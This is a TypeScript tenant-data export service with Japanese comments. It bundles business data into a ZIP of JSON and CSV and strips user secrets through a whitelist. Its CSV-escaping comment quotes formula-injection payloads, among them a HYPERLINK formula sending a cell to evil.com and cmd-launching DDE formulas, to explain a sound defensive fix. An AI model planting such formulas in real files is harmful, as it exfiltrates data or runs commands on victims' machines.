/**
 * テナントデータ一括エクスポートサービス (P-C / 2026-05-08)
 *
 * 役割:
 *   テナント所属の業務データを ZIP ファイル (JSON + CSV) に固めて返却する。
 *   サービス離脱時のデータ持ち出し / 監査用途 / バックアップで使用。
 *
 * 認可境界:
 *   - 呼出側で「テナント管理者 (admin) が自テナント」or「super_admin が任意テナント」を確認した前提。
 *   - 本サービスは tenantId を受け取り、その tenantId スコープのデータのみを返す。
 *   - User の PII (passwordHash / mfaSecret / token 類) は出力前にホワイトリスト方式で除去。
 *
 * 出力 ZIP 構成:
 *   tasukiba-export-{slug}-{YYYY-MM-DD}.zip
 *   ├── README.md                 (使い方説明)
 *   ├── metadata.json             (export 日時 / テナント情報 / 件数サマリ)
 *   ├── data/                     (完全な構造化データ、JSON)
 *   │   ├── projects.json
 *   │   ├── tasks.json
 *   │   ├── estimates.json
 *   │   ├── project_members.json
 *   │   ├── knowledge.json
 *   │   ├── knowledge_projects.json
 *   │   ├── risks_issues.json
 *   │   ├── retrospectives.json
 *   │   ├── memos.json
 *   │   ├── customers.json
 *   │   ├── stakeholders.json
 *   │   ├── comments.json
 *   │   ├── mentions.json
 *   │   ├── attachments.json      (URL のみ、実ファイルは外部ストレージ)
 *   │   └── users.json            (PII 抜き)
 *   └── csv/                      (Excel 取込用、主要 5 entity)
 *       ├── projects.csv
 *       ├── knowledge.csv
 *       ├── risks_issues.csv
 *       ├── retrospectives.csv
 *       └── memos.csv
 *
 * 設計判断:
 *   - **Beginner プラン期限切れテナントもエクスポート可** (P-C 仕様、2026-05-08 ユーザ確定):
 *     middleware は GET method を弾かないため、特別な制御不要 (= 自動的に許可される)。
 *     ただし P-B の警告メール文言は「エクスポートは引き続き可能」に修正済。
 *   - **PII 除去はホワイトリスト方式**: User からは事前に許可した列のみ出力。
 *     新フィールド追加で誤ってトークン類を漏らさないよう厳格に管理。
 *   - **Date は ISO 8601 文字列**: タイムゾーン情報込みで保存、再 import 容易性を維持。
 *   - **embedding 列 (vector(1024)) は除外**: Prisma が直接読めず、エクスポートしても利用できない。
 *
 * 関連:
 *   - 計画: docs/roadmap/V1_FINAL_TASKS.md P-C
 *   - API: src/app/api/tenants/me/export/route.ts (テナント管理者経路)
 *         src/app/api/admin/super/tenants/[id]/export/route.ts (super_admin 代行経路)
 */

import JSZip from 'jszip';
import { prisma } from '@/lib/db';
// 2026-06-04: CSV の選択値も画面の日本語表示に揃える (閲覧用。復元は data/*.json なので無影響)。
import {
  DEV_METHODS,
  CONTRACT_TYPES,
  PROJECT_STATUSES,
  KNOWLEDGE_TYPES,
  VISIBILITIES,
  RISK_ISSUE_STATES,
  PRIORITIES,
} from '@/config/master-data';

/** リスク・課題の種別 (master-data に専用定数が無いためここで定義)。 */
const RISK_TYPE_LABELS: Readonly<Record<string, string>> = { risk: 'リスク', issue: '課題' };
/** メモの公開範囲 (private/public)。資産の VISIBILITIES (draft/public) とは別軸。 */
const MEMO_VISIBILITY_LABELS: Readonly<Record<string, string>> = { private: '自分のみ', public: '公開' };

// ================================================================
// 公開型
// ================================================================

export type DataExportResult = {
  /** ZIP ファイルのバイト配列 (Buffer / NextResponse で返却) */
  zipBuffer: Uint8Array;
  /** ファイル名 (Content-Disposition で使用) */
  filename: string;
  /** 件数サマリ (UI 表示や監査ログに使う) */
  summary: ExportSummary;
};

export type ExportSummary = {
  exportedAt: string; // ISO 8601
  tenantId: string;
  tenantName: string;
  tenantSlug: string;
  // PR-1 (2026-05-15): テナント単位の i18n 設定。インポート先で再現するのに利用できる。
  tenantTimezone: string;
  tenantLocale: string;
  counts: {
    projects: number;
    tasks: number;
    estimates: number;
    projectMembers: number;
    knowledge: number;
    knowledgeProjects: number;
    risksIssues: number;
    // PR feat/asset-multi-project-linking: M:N 紐付け行数も含める
    riskIssueProjects: number;
    retrospectives: number;
    retrospectiveProjects: number;
    memos: number;
    customers: number;
    stakeholders: number;
    comments: number;
    mentions: number;
    attachments: number;
    users: number;
  };
};

// ================================================================
// 公開関数
// ================================================================

/**
 * 指定テナントの全業務データを ZIP 化して返す。
 *
 * @param tenantId 対象テナント ID
 * @throws Error('TENANT_NOT_FOUND') テナント不在 or 削除済
 */
export async function exportTenantData(tenantId: string): Promise<DataExportResult> {
  // ---------- 1. テナント情報取得 (削除済テナントは拒否) ----------
  const tenant = await prisma.tenant.findFirst({
    where: { id: tenantId, deletedAt: null },
    // PR-1 (2026-05-15): tenant.timezone / tenant.locale を metadata に含める
    select: { id: true, name: true, slug: true, timezone: true, locale: true },
  });
  if (!tenant) throw new Error('TENANT_NOT_FOUND');

  // ---------- 2. 全 entity を tenantId スコープで取得 (並列) ----------
  // deletedAt: null フィルタは「現役データ」のみを対象。論理削除データは出さない設計
  // (= 顧客が「現在自分が管理しているデータ」を持ち出せれば十分)。
  const [
    projects,
    tasks,
    estimates,
    projectMembers,
    knowledge,
    knowledgeProjects,
    risksIssues,
    riskIssueProjects,
    retrospectives,
    retrospectiveProjects,
    memos,
    customers,
    stakeholders,
    comments,
    mentions,
    attachments,
    users,
  ] = await Promise.all([
    prisma.project.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    // P-C (2026-05-08): Task / Estimate / ProjectMember は tenantId を直接持たないため、
    //   親 Project 経由で関係フィルタする (= where: { project: { tenantId } })。
    prisma.task.findMany({
      where: { project: { tenantId }, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.estimate.findMany({
      where: { project: { tenantId }, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.projectMember.findMany({
      where: { project: { tenantId } },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.knowledge.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    // KnowledgeProject も tenantId なし + createdAt なし → knowledge 経由
    prisma.knowledgeProject.findMany({
      where: { knowledge: { tenantId } },
    }),
    prisma.riskIssue.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    // PR feat/asset-multi-project-linking: M:N 中間テーブルを export に含める
    prisma.riskIssueProject.findMany({
      where: { riskIssue: { tenantId } },
    }),
    prisma.retrospective.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.retrospectiveProject.findMany({
      where: { retrospective: { tenantId } },
    }),
    prisma.memo.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.customer.findMany({
      where: { tenantId },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.stakeholder.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.comment.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.mention.findMany({
      where: { tenantId },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.attachment.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
    prisma.user.findMany({
      where: { tenantId, deletedAt: null },
      orderBy: { createdAt: 'asc' },
    }),
  ]);

  // ---------- 3. PII 除去 (User のホワイトリスト方式) ----------
  const safeUsers = users.map(stripUserPII);

  // ---------- 4. embedding 列を除去 (Prisma が読めず、エクスポート意味なし) ----------
  const stripEmbedding = <T extends Record<string, unknown>>(rows: T[]): T[] =>
    rows.map((r) => {
      const copy = { ...r };
      delete (copy as Record<string, unknown>).contentEmbedding;
      return copy;
    });

  // ---------- 5. JSON + CSV を ZIP に固める ----------
  const zip = new JSZip();
  const dateStr = new Date().toISOString().split('T')[0]!;
  const exportedAt = new Date().toISOString();

  // metadata.json
  const summary: ExportSummary = {
    exportedAt,
    tenantId: tenant.id,
    tenantName: tenant.name,
    tenantSlug: tenant.slug,
    // PR-1 (2026-05-15): テナント i18n 設定
    tenantTimezone: tenant.timezone,
    tenantLocale: tenant.locale,
    counts: {
      projects: projects.length,
      tasks: tasks.length,
      estimates: estimates.length,
      projectMembers: projectMembers.length,
      knowledge: knowledge.length,
      knowledgeProjects: knowledgeProjects.length,
      risksIssues: risksIssues.length,
      // PR feat/asset-multi-project-linking: M:N 紐付けの行数も summary に含める
      riskIssueProjects: riskIssueProjects.length,
      retrospectives: retrospectives.length,
      retrospectiveProjects: retrospectiveProjects.length,
      memos: memos.length,
      customers: customers.length,
      stakeholders: stakeholders.length,
      comments: comments.length,
      mentions: mentions.length,
      attachments: attachments.length,
      users: safeUsers.length,
    },
  };
  zip.file('metadata.json', JSON.stringify(summary, null, 2));
  zip.file('README.md', buildReadme(summary));

  // data/*.json (構造化データ)
  const dataDir = zip.folder('data');
  if (dataDir == null) throw new Error('jszip_internal_error');

  dataDir.file('projects.json', toJson(stripEmbedding(projects as never)));
  dataDir.file('tasks.json', toJson(tasks));
  dataDir.file('estimates.json', toJson(estimates));
  dataDir.file('project_members.json', toJson(projectMembers));
  dataDir.file('knowledge.json', toJson(stripEmbedding(knowledge as never)));
  dataDir.file('knowledge_projects.json', toJson(knowledgeProjects));
  dataDir.file('risks_issues.json', toJson(stripEmbedding(risksIssues as never)));
  dataDir.file('risk_issue_projects.json', toJson(riskIssueProjects));
  dataDir.file('retrospectives.json', toJson(stripEmbedding(retrospectives as never)));
  dataDir.file('retrospective_projects.json', toJson(retrospectiveProjects));
  dataDir.file('memos.json', toJson(stripEmbedding(memos as never)));
  dataDir.file('customers.json', toJson(customers));
  dataDir.file('stakeholders.json', toJson(stakeholders));
  dataDir.file('comments.json', toJson(comments));
  dataDir.file('mentions.json', toJson(mentions));
  dataDir.file('attachments.json', toJson(attachments));
  dataDir.file('users.json', toJson(safeUsers));

  // csv/*.csv (主要 5 entity の Excel 取込用)
  const csvDir = zip.folder('csv');
  if (csvDir == null) throw new Error('jszip_internal_error');

  csvDir.file('projects.csv', buildProjectsCsv(projects));
  csvDir.file('knowledge.csv', buildKnowledgeCsv(knowledge));
  csvDir.file('risks_issues.csv', buildRisksIssuesCsv(risksIssues));
  csvDir.file('retrospectives.csv', buildRetrospectivesCsv(retrospectives));
  csvDir.file('memos.csv', buildMemosCsv(memos));
  // 2026-06-04: csv/ の各列の意味・入れるデータ・プルダウン値を同梱 (人間が編集の参考にする)
  csvDir.file('項目リファレンス.md', buildCsvFieldReference());

  const zipBuffer = await zip.generateAsync({ type: 'uint8array', compression: 'DEFLATE' });

  return {
    zipBuffer,
    filename: `tasukiba-export-${tenant.slug}-${dateStr}.zip`,
    summary,
  };
}

// ================================================================
// 内部: PII 除去
// ================================================================

/**
 * User からエクスポートしてよい列のみを残す (ホワイトリスト方式)。
 *
 * 出力する列: 顧客の所有情報 (氏名・メール・ロール・タイムゾーン等)
 * 除外する列:
 *   - 認証情報: passwordHash, mfaSecretEncrypted
 *   - ロック情報: failedLoginCount / lockedUntil / temporaryLockCount /
 *                permanentLock / mfaEnabled / mfaFailedCount / mfaLockedUntil
 *     (これらは内部運用情報で顧客にとって不要 + 漏洩リスク)
 *   - 内部フラグ: forcePasswordChange
 *
 * 2026-05-13 (security/data-export-pii-ci-guard, L-6): User schema の列追加を
 *   検知する CI ガードのため、出力対象 / 除外対象を **定数として明示**。
 *   data-export.service.test.ts で `USER_EXPORT_FIELDS ∪ USER_PII_FIELDS` が
 *   `Prisma.UserScalarFieldEnum` の全列と一致することを assert する。
 *   新フィールド追加で意図せず PII が漏れる事故を防ぐ。
 */
export const USER_EXPORT_FIELDS = [
  'id',
  'tenantId',
  'name',
  'email',
  'systemRole',
  'isActive',
  'themePreference',
  'lastLoginAt',
  // 2026-06-03: 招待受諾日時 (アカウント状態 招待中/有効/無効 の導出元)。ライフサイクル metadata で PII ではない。
  'invitationAcceptedAt',
  // 2026-06-03: 作成者/更新者 (操作した管理者の UUID)。監査 metadata で PII ではない。
  'createdBy',
  'updatedBy',
  'createdAt',
  'updatedAt',
] as const;

/**
 * User の絶対に出力してはいけない PII / 内部運用フィールド一覧。
 * USER_EXPORT_FIELDS と重複しないこと (CI が同時 assert する)。
 */
export const USER_PII_FIELDS = [
  'passwordHash',
  'mfaSecretEncrypted',
  'failedLoginCount',
  'lockedUntil',
  'temporaryLockCount',
  'permanentLock',
  'mfaEnabled',
  'mfaEnabledAt',
  'mfaFailedCount',
  'mfaLockedUntil',
  'forcePasswordChange',
  'deletedAt',
  // 2026-05-13 (PR #350 security/jwt-invalidation, L-1): JWT 失効カウンタは内部認証情報。
  //   admin 操作で increment され既存 JWT を即時失効させるための実装詳細であり、
  //   顧客データ持ち出しの export 対象には含めない。
  'tokenVersion',
] as const;

function stripUserPII(user: Record<string, unknown>): Record<string, unknown> {
  // PR-1 (2026-05-15): timezone / locale はテナント単位に集約されたため User からは除外。
  //   テナント metadata セクション (= tenant.timezone / tenant.locale) で出力される。
  const result: Record<string, unknown> = {};
  for (const key of USER_EXPORT_FIELDS) {
    result[key] = user[key];
  }
  return result;
}

// ================================================================
// 内部: JSON シリアライザ (Date / BigInt 対応)
// ================================================================

function toJson(rows: unknown[]): string {
  return JSON.stringify(rows, jsonReplacer, 2);
}

/** Date は ISO 文字列、BigInt は string にする (= 受け側が確実に読める形) */
function jsonReplacer(_key: string, value: unknown): unknown {
  if (value instanceof Date) return value.toISOString();
  if (typeof value === 'bigint') return value.toString();
  return value;
}

// ================================================================
// 内部: CSV ビルダー
// ================================================================

/**
 * RFC 4180 互換の CSV エスケープ + Formula Injection 対策 (CWE-1236)。
 *
 * 2026-05-13 (security/csv-formula-injection, B-4):
 *   Excel/Google Sheets が `=`/`+`/`-`/`@`/`\t`/`\r` で始まる値を **数式評価** するため、
 *   悪意ユーザが `displayName = '=HYPERLINK("https://evil.com/?"&A1, "click")'` のような
 *   ペイロードを CSV エクスポートに混入させると、admin/super がファイルを開いた瞬間に
 *   外部 URL を踏まされて資格情報が抜かれる攻撃が成立する (CSV Injection)。
 *   対象文字で始まる値は `'` (シングルクォート) を前置し、Excel に文字列として
 *   解釈させる (OWASP 推奨手法)。
 *
 *   攻撃ペイロード例:
 *     =cmd|'/c calc'!A1
 *     @SUM(1+1)*cmd|'/c calc'!A1
 *     -2+3+cmd|'/c calc'!A1
 *     \tDDE("cmd", ...)  ← タブ始まり
 */
export function csvEscape(value: unknown): string {
  if (value == null) return '';
  let s: string;
  if (value instanceof Date) s = value.toISOString();
  else if (typeof value === 'object') s = JSON.stringify(value);
  else s = String(value);
  // B-4: Formula Injection 対策。数式メタ文字で始まる値は `'` で文字列化を強制。
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/**
 * CSV カラム定義。`header` は画面に合わせた日本語見出し、`field` は行オブジェクトの実キー。
 *
 * 2026-06-04: CSV のヘッダを英語フィールド名から **画面の日本語ラベル** に変更 (UX 改善)。
 *   ZIP の **復元 (data-import) は `data/*.json` を読むため、CSV ヘッダの言語変更は往復に影響しない**
 *   (csv/ は人間が Excel 等で閲覧する用)。データ値は従来と同一で、見出しのみ日本語化。
 */
type CsvColumn = {
  header: string;
  field: string;
  /** 選択値を画面表示の日本語へ変換する対応表 (内部値→日本語)。未該当値・空はそのまま。 */
  map?: Readonly<Record<string, string>>;
};

function buildCsv(columns: CsvColumn[], rows: Array<Record<string, unknown>>): string {
  const lines = ['﻿' + columns.map((c) => csvEscape(c.header)).join(',')]; // UTF-8 BOM (Excel 日本語対応)
  for (const row of rows) {
    lines.push(
      columns
        .map((c) => {
          const raw = row[c.field];
          const value = c.map && typeof raw === 'string' ? (c.map[raw] ?? raw) : raw;
          return csvEscape(value);
        })
        .join(','),
    );
  }
  return lines.join('\r\n');
}

function buildProjectsCsv(projects: Array<Record<string, unknown>>): string {
  return buildCsv(
    [
      { header: 'ID', field: 'id' },
      { header: 'プロジェクト名', field: 'name' },
      { header: '顧客ID', field: 'customerId' },
      { header: '目的', field: 'purpose' },
      { header: '背景', field: 'background' },
      { header: 'スコープ', field: 'scope' },
      { header: 'スコープ外', field: 'outOfScope' },
      { header: '開発方式', field: 'devMethod', map: DEV_METHODS },
      { header: '契約形態', field: 'contractType', map: CONTRACT_TYPES },
      { header: '業務ドメインタグ', field: 'businessDomainTags' },
      { header: '技術スタックタグ', field: 'techStackTags' },
      { header: '工程タグ', field: 'processTags' },
      { header: '開始予定日', field: 'plannedStartDate' },
      { header: '終了予定日', field: 'plannedEndDate' },
      { header: 'ステータス', field: 'status', map: PROJECT_STATUSES },
      { header: '備考', field: 'notes' },
      { header: '作成者ID', field: 'createdBy' },
      { header: '更新者ID', field: 'updatedBy' },
      { header: '作成日時', field: 'createdAt' },
      { header: '更新日時', field: 'updatedAt' },
    ],
    projects,
  );
}

function buildKnowledgeCsv(knowledge: Array<Record<string, unknown>>): string {
  return buildCsv(
    [
      { header: 'ID', field: 'id' },
      { header: 'タイトル', field: 'title' },
      { header: '種別', field: 'knowledgeType', map: KNOWLEDGE_TYPES },
      { header: '背景', field: 'background' },
      { header: '内容', field: 'content' },
      { header: '結果', field: 'result' },
      { header: '結論', field: 'conclusion' },
      { header: '推奨', field: 'recommendation' },
      { header: '再利用性', field: 'reusability' },
      { header: '技術タグ', field: 'techTags' },
      { header: '開発手法', field: 'devMethod' },
      { header: '工程タグ', field: 'processTags' },
      { header: '業務ドメインタグ', field: 'businessDomainTags' },
      { header: '公開範囲', field: 'visibility', map: VISIBILITIES },
      // feat/asset-assignee-expansion (2026-05-26): 担当者を export/import round-trip 対応
      { header: '担当者ID', field: 'assigneeId' },
      { header: '作成者ID', field: 'createdBy' },
      { header: '更新者ID', field: 'updatedBy' },
      { header: '作成日時', field: 'createdAt' },
      { header: '更新日時', field: 'updatedAt' },
    ],
    knowledge,
  );
}

function buildRisksIssuesCsv(risksIssues: Array<Record<string, unknown>>): string {
  return buildCsv(
    [
      { header: 'ID', field: 'id' },
      { header: 'プロジェクトID', field: 'projectId' },
      { header: '種別', field: 'type', map: RISK_TYPE_LABELS },
      { header: '件名', field: 'title' },
      // feat/risk-issue-4-section (2026-05-26): occurrence を title の直後に追加
      { header: '発生事象', field: 'occurrence' },
      { header: 'メモ', field: 'content' },
      { header: '原因', field: 'cause' },
      { header: '対応方針', field: 'responsePolicy' },
      { header: '対応詳細', field: 'responseDetail' },
      { header: '状態', field: 'state', map: RISK_ISSUE_STATES },
      { header: '優先度', field: 'priority', map: PRIORITIES },
      { header: '起票者ID', field: 'reportedBy' },
      { header: '担当者ID', field: 'assigneeId' },
      { header: '起票日時', field: 'reportedAt' },
      { header: '解決日時', field: 'resolvedAt' },
      { header: '作成日時', field: 'createdAt' },
      { header: '更新日時', field: 'updatedAt' },
    ],
    risksIssues,
  );
}

function buildRetrospectivesCsv(retrospectives: Array<Record<string, unknown>>): string {
  return buildCsv(
    [
      { header: 'ID', field: 'id' },
      { header: 'プロジェクトID', field: 'projectId' },
      { header: '実施日', field: 'conductedDate' },
      { header: '良かった点', field: 'goodPoints' },
      { header: '問題点', field: 'problems' },
      { header: '次回改善事項', field: 'improvements' },
      { header: '公開範囲', field: 'visibility', map: VISIBILITIES },
      // feat/asset-assignee-expansion (2026-05-26): 担当者を export/import round-trip 対応
      { header: '担当者ID', field: 'assigneeId' },
      { header: '作成者ID', field: 'createdBy' },
      { header: '作成日時', field: 'createdAt' },
      { header: '更新日時', field: 'updatedAt' },
    ],
    retrospectives,
  );
}

function buildMemosCsv(memos: Array<Record<string, unknown>>): string {
  return buildCsv(
    [
      { header: 'ID', field: 'id' },
      { header: 'タイトル', field: 'title' },
      { header: '内容', field: 'content' },
      { header: '公開範囲', field: 'visibility', map: MEMO_VISIBILITY_LABELS },
      // feat/asset-assignee-expansion (2026-05-26): 担当者を export/import round-trip 対応
      { header: '担当者ID', field: 'assigneeId' },
      { header: '作成者ID', field: 'createdBy' },
      { header: '作成日時', field: 'createdAt' },
      { header: '更新日時', field: 'updatedAt' },
    ],
    memos,
  );
}

// ================================================================
// 内部: csv/ 項目リファレンス (ZIP 同梱)
// ================================================================

/**
 * csv/ 各ファイルの「列 → 画面項目 / 入れるデータ / 編集可否」とプルダウン値を説明する Markdown。
 * ダウンロードした人がファイルを編集する際の参考にする。完全版は docs/public/export-csv-reference.md。
 */
function buildCsvFieldReference(): string {
  return `# csv/ フォルダ 項目リファレンス

このフォルダの CSV は「人間が Excel 等で内容を確認・編集するための閲覧用」です。見出し・選択値とも画面と同じ日本語です。

> ⚠️ **重要**: この csv/ を編集して ZIP を再取り込みしても、編集は反映されません（復元は data/ 配下の JSON を使用します）。
> 自分のデータを取り込みたい場合は、たすきばにログイン →「設定 → テナント設定 → 外部データ移行」から CSV を取り込んでください。
> （その画面では、お手元の CSV の列を画面項目に割り当てて取り込めます。下の対応表がそのまま参考になります。）

## 共通: 編集しない列（システムが自動で設定）

\`ID\` / \`顧客ID\` / \`プロジェクトID\` / \`担当者ID\` / \`起票者ID\` / \`作成者ID\` / \`更新者ID\` / \`作成日時\` / \`更新日時\` / \`起票日時\` / \`解決日時\`
→ これらは内部の識別子・履歴で、**手で書き換えないでください**（移行ウィザードでも入力対象外です）。

## ファイルごとの列（編集する業務項目）

### projects.csv（プロジェクト）
プロジェクト名 / 目的 / 背景 / スコープ / スコープ外 / **開発方式**(選択) / **契約形態**(選択) / 開始予定日 / 終了予定日 / **ステータス**(選択) / 備考

### knowledge.csv（ナレッジ）
タイトル / **種別**(選択) / 背景 / 内容 / 結果 / **公開範囲**(選択)

### risks_issues.csv（リスク・課題）
**種別**(リスク/課題) / 件名 / 発生事象 / メモ / 原因 / 対応方針 / **状態**(選択) / （優先度は自動算出のため入力不可）

### retrospectives.csv（振り返り）
実施日 / 良かった点 / 問題点 / 次回改善事項 / **公開範囲**(選択)

### memos.csv（メモ）
タイトル / 内容 / **公開範囲**(選択)

## プルダウン項目に入れる値

| 項目 | 入れる値 |
|---|---|
| 公開範囲（ナレッジ/リスク/課題/振り返り） | 下書き / 公開 |
| 公開範囲（メモ） | 自分のみ / 公開 |
| プロジェクト ステータス | 企画中 / 見積中 / 計画中 / 実行中 / クローズ |
| 開発方式 | スクラッチ開発 / ローコード・ノーコード開発 / パッケージ開発 / そのほか |
| 契約形態 | 準委任 / 請負 / SES / そのほか（空=未設定） |
| ナレッジ 種別 | 調査 / 検証 / 障害対応 / 意思決定 / 教訓 / ベストプラクティス / その他 |
| リスク・課題 種別 | リスク / 課題 |
| リスク・課題 状態 | 未対応 / 対応中 / 監視中 / 解消 |
| 日付（開始予定日・終了予定日・実施日 等） | 2026-06-04 のような日付（多少崩れても取り込み時に自動補正） |

> 上記以外の値を入れた場合、取り込み時は安全側に倒します（公開範囲は「下書き」、その他は既定値）。
`;
}

// ================================================================
// 内部: README ビルダー
// ================================================================

function buildReadme(summary: ExportSummary): string {
  return `# たすきば Knowledge Relay - データエクスポート

このアーカイブには「${summary.tenantName}」テナントの業務データが含まれています。

## エクスポート情報
- 実行日時: ${summary.exportedAt}
- テナント名: ${summary.tenantName}
- テナント slug: ${summary.tenantSlug}
- テナント ID: ${summary.tenantId}

## 件数サマリ
- プロジェクト: ${summary.counts.projects}
- タスク (WBS): ${summary.counts.tasks}
- 見積: ${summary.counts.estimates}
- プロジェクトメンバー: ${summary.counts.projectMembers}
- ナレッジ: ${summary.counts.knowledge}
- ナレッジ-プロジェクト紐付け: ${summary.counts.knowledgeProjects}
- リスク/課題: ${summary.counts.risksIssues}
- 振り返り: ${summary.counts.retrospectives}
- メモ: ${summary.counts.memos}
- 顧客: ${summary.counts.customers}
- ステークホルダー: ${summary.counts.stakeholders}
- コメント: ${summary.counts.comments}
- メンション: ${summary.counts.mentions}
- 添付ファイル (URL のみ): ${summary.counts.attachments}
- ユーザ: ${summary.counts.users}

## ディレクトリ構成

\`\`\`
このアーカイブ/
├── README.md             ← 本ファイル
├── metadata.json         ← エクスポート情報の機械可読版
├── data/                 ← 完全な構造化データ (JSON)
│   ├── projects.json
│   ├── tasks.json
│   ├── ... (各エンティティ毎に分離)
│   └── users.json        (※ パスワードや認証情報は除外済)
└── csv/                  ← Excel 取込用 (主要 5 種別)
    ├── projects.csv
    ├── knowledge.csv
    ├── risks_issues.csv
    ├── retrospectives.csv
    └── memos.csv
\`\`\`

## 注意事項

- **添付ファイル (attachments.json)**: URL のみが記録されています。実ファイルは外部ストレージにあるため、別途取得してください。
- **users.json の PII**: パスワードハッシュ・MFA 秘密鍵・トークン類は **除外** されています (顧客の所有情報のみ含まれます)。
- **論理削除 (deletedAt)**: 既に削除されたデータは含まれません。現役データのみのエクスポートです。
- **意味類似度 (embedding)**: ベクトル列はサービス内部の計算用で再利用できないため除外されています。
- **CSV 形式**: 配列・JSON 列は文字列として収録されています (Excel で開いた後の手動パース推奨)。
`;
}
